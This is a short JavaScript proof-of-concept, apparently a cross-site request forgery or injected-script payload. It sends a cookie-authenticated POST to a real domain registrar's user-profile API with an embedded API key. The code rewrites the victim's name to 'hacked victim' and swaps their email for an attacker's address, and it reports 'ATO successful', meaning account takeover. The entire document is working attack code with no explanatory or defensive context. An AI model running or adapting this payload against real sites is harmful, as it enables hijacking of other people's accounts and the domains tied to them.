(async function() {
    try {
        const response = await fetch('https://www.networksolutions.com/sfcore.do?updateUserProfileInfo', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            credentials: 'include',
            body: JSON.stringify({
                "request": {
                    "requestInfo": {
                        "service": "UserAPI",
                        "method": "updateUserProfileInfo",
                        "clientId": "AccountManager",
                        "apiAccessKey": "nwmhwqzx0e3pjvtbbeb4utpzovg"
                    },
                    "firstName": "hacked",
                    "lastName": "victim",
                    "email": "newuser@domain.com",
                    "companyName": "",
                    "phone": "05444479816",
                    "address": {
                        "address1": "zebra test. test",
                        "address2": "",
                        "city": "test",
                        "stateProv": "test",
                        "postalCode": "test",
                        "country": "TR",
                        "vatId": "",
                        "stateTaxExemptId": "",
                        "fax": ""
                    }
                }
            })
        });

        if (response.ok) {
            alert('ATO successful! Status: ' + response.status);
        } else {
            alert('ATO failed! Status: ' + response.status);
        }
    } catch (error) {
        alert('err: ' + error.message);
    }
})();
